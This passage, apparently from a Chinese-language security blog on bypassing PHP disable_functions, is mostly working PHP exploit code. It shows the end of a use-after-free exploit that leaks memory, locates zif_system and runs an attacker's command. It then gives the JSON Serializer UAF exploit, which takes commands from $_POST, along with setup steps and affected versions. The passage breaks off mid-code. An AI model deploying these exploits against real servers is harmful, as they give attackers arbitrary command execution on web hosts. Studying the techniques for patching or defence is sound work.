&#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;chtg = <span class="variable language_">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">    <span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥åœ¨webç›®å½•åˆ›å»ºä¸ªphpæ–‡ä»¶æŠŠä»£ç å¤åˆ¶è¿›å»ï¼Œç„¶åè®¿é—®å³å¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703468.png" alt="image-20231206170304377"></p><h2 id="åˆ©ç”¨-Json-Serializer-UAF"><a href="#åˆ©ç”¨-Json-Serializer-UAF" class="headerlink" title="åˆ©ç”¨ Json Serializer UAF"></a>åˆ©ç”¨ Json Serializer UAF</h2><p>åˆ©ç”¨jsonåºåˆ—åŒ–ä¸­çš„å †æº¢å‡ºè§¦å‘ï¼Œå€Ÿä»¥ç»•è¿‡disable_function</p><h3 id="åˆ©ç”¨æ¡ä»¶-9"><a href="#åˆ©ç”¨æ¡ä»¶-9" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><h3 id="åˆ©ç”¨æ–¹æ³•-4"><a href="#åˆ©ç”¨æ–¹æ³•-4" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p><a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">exp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$cmd = &quot;id&quot;;</span></span><br><span class="line">  <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[cmd];</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">8</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$spl1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x18</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$spl1</span>::<span class="variable">$leak</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 